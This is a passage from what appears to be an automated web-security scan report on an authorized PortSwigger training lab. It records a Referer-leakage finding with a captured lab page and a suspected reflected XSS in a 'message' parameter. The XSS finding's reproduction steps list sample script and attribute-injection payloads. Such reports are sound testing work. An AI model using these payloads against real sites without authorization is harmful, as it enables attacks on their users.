<p>You are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover. Give your best friend the time of its life, book today as all early birds have an added bonus of choosing the colors of the balloons.</p>
                        <div class="is-linkback">
```

<a id="finding-6"></a>

### 6. [INFO] [burp] Cross-domain Referer leakage

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The page was loaded from a URL containing a query string:<ul><li>https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/product</li></ul>The response contains the following links to other domains:<ul><li>https://portswigger.net/web-security/dashboard</li><li>https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit</li><li>https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger. @ https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/product

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr6j5zno-3b` — `artifacts/_/ev-mr6j5zno-3b/`

Request:

```http
GET /product HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net

GET /product?productId=2 HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 8144

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="product">
                        <h3>Pet Experience Days</h3>
                        <img src="/resources/images/rating5.png">
                        <div id="price">$45.52</div>
                        <img src="/image/productcatalog/products/15.jpg">
                        <label>Description:</label>
                        <p>Give your beloved furry friend their dream birthday. Here at PED, we offer unrivaled entertainment at competitive prices. Starting with our best seller, the Balloon Ride.</p>
<p>A large collection of helium-filled balloons will be attached with a harness to your dog, once we are confident we have enough power for takeoff then it's up, up and away they go. This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.</p>
<p>Your dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health & Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.</p>
<p>You are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover. Give your best friend the time of its life, book today as all early birds have an added bonus of choosing the colors of the balloons.</p>
                        <div class="is-linkback">
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-7"></a>

### 7. [SUSPECTED] [MEDIUM] [xss-reflected] Suspected Reflected XSS in `message` parameter (filter present, bypasses neutralized)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/

**Anomaly (why this is a lead):** The `message` query param reflects user input verbatim in the HTML response body (confirmed by probe_xss), but all 10 tag/handler filter-bypass vectors were neutralized by server-side sanitization. probe_dom_xss also found no live DOM sink. Reflection context may allow a context-specific bypass (e.g. JS string or attribute injection) not covered by the automated corpus — warrants manual testing with context-aware payloads.

The root path (`/`) accepts a `message` query parameter whose value is reflected into the HTML response. Automated testing with a 10-vector filter-bypass corpus confirmed reflection is present but all active tag/event-handler payloads were escaped or stripped. A DOM-based execution test (real browser) also found no live sink. The reflection context (plain HTML text node vs. JS string vs. attribute) was not precisely mapped, leaving open the possibility of a context-specific payload the automated corpus did not cover.

**Reproduction**

```
1. Navigate to `/?message=test` — observe "test" appears in the page body.\n2. Attempt `/?message=<script>alert(1)</script>` — tag is stripped/escaped.\n3. Manually inspect the exact HTML context where the reflection lands (View Source).\n4. If inside a JS string or an attribute, craft a context-specific payload (e.g. `"-alert(1)-"` or `' onmouseover=alert(1) x='`) and test whether it executes.
```

**Evidence**

- Evidence `ev-mr6h94zx-v` — `artifacts/s-0002/ev-mr6h94zx-v/`

Request:

```http
GET /?message=verdictdomXmr6h93mkj13ssafe HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
```

Response:

```http
HTTP/1.1 200
content-type: text/html

no execution — payload was not run by the browser (escaped / not a live sink)
```
